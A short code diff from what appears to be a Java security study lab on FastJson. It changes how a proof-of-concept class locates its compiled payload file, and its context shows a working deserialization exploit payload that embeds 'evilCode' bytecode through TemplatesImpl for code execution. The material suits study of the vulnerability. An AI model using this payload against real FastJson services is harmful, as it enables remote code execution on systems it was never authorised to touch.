@@ -25,7 +25,8 @@ public class Poc1 {
 
     public static void main(String args[]){
         try {
-            String classFilePath = "C:\\Users\\Catcher\\Desktop\\JavaSec\\01.Java安全研究\\GitHub-JavaSec\\JavaSec-Study\\FastJson-Labs\\fastjson-demo01\\target\\classes\\CalcTest.class";
+            // .toURI()是因为路径中包含中文
+            String classFilePath = Poc1.class.getResource("/CalcTest.class").toURI().getPath();
             String evilCode = readClass(classFilePath);
             final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
             String text1 = "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," + ",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
